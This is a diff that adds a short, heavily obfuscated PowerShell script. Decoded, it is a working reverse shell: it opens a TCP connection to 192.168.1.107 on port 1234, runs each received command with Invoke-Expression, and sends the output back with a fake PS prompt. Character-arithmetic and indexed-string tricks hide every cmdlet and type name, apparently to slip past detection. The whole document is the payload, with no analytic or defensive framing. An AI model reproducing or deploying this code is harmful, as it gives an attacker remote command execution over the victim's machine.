@@ -1,0 +1,11 @@
+$fzrWKRTQaSucMvI5 = & (("YNI5StL-CjEhB3Gp67n0PFDyd8TUkVAWMo41aXls2iucRgzqQJfvKZxbreOwm9H")[1,57,59,7,58,55,9,57,43,5] -join '') $([char](68*83/68)+[char](67*121/67)+[char](72+115-72)+[char](49*116/49)+[char](64+101-64)+[char](17+109-17)+[char](0+46-0)+[char](73+78-73)+[char](43+101-43)+[char](9+116-9)+[char](27*46/27)+[char](33+83-33)+[char](0+111-0)+[char](109*99/109)+[char](9+107-9)+[char](0+101-0)+[char](101+116-101)+[char](47+115-47)+[char](105*46/105)+[char](0+84-0)+[char](109*67/109)+[char](0+80-0)+[char](0+67-0)+[char](9*108/9)+[char](72*105/72)+[char](0+101-0)+[char](70+110-70)+[char](114+116-114))("192.168.1.107", "1234");
+$X7lzQwxGGQqT0ejPzB = (($fzrWKRTQaSucMvI5.GetStream()));[byte[]]$aJVWe9 = 0..$(65535+65535+0-65535)|ForEach-Object{$_}|%{$_}|%{0};
+while(($Po = $X7lzQwxGGQqT0ejPzB.Read($aJVWe9, 0, $aJVWe9.Length)) -ne 0){
+    $Ne = (& (("YNI5StL-CjEhB3Gp67n0PFDyd8TUkVAWMo41aXls2iucRgzqQJfvKZxbreOwm9H")[1,57,59,7,58,55,9,57,43,5] -join '') -TypeName $([char](102*83/102)+[char](77*121/77)+[char](29+115-29)+[char](59+116-59)+[char](87*101/87)+[char](12*109/12)+[char](68*46/68)+[char](85+84-85)+[char](45+101-45)+[char](0+120-0)+[char](55*116/55)+[char](53*46/53)+[char](64*65/64)+[char](0+83-0)+[char](0+67-0)+[char](71*73/71)+[char](99*73/99)+[char](0+69-0)+[char](105*110/105)+[char](0+99-0)+[char](50*111/50)+[char](54+100-54)+[char](48*105/48)+[char](0+110-0)+[char](80*103/80))).GetString($aJVWe9,0, $Po);
+    $Nimuf7GbUaTKv2EZJzwFS = (& ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |ForEach-Object{$_}|%{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$_}|%{$_}| % {$_}) $Ne 2>&1 |ForEach-Object{$_}|%{$_}| & (("tY7UQNXdx5Eiwc3Gj0yMVCoIRS-mh8OWbKTJn4kvBeAlg6u2LDPs9qaHpZF1fzr")[30,46,0,26,25,0,62,11,36,44] -join '') );
+    $6I5ZhKW = $Nimuf7GbUaTKv2EZJzwFS + 'PS ' + (& (("YdA38rlZLw9iPWgMh6q2zynRkpQmFObKf1Su5HJoaGNvD4cxsVU7IXT-BjEt0Ce")[41,62,59,55,8,39,46,40,59,11,39,22] -join '')).Path + '> ';
+    $QrxbSW = ([text.encoding]::ASCII).GetBytes($6I5ZhKW);
+    $X7lzQwxGGQqT0ejPzB.Write($QrxbSW,0,$QrxbSW.Length);
+    $($(($X7lzQwxGGQqT0ejPzB.Flush())))
+};
+((($fzrWKRTQaSucMvI5.Close())));
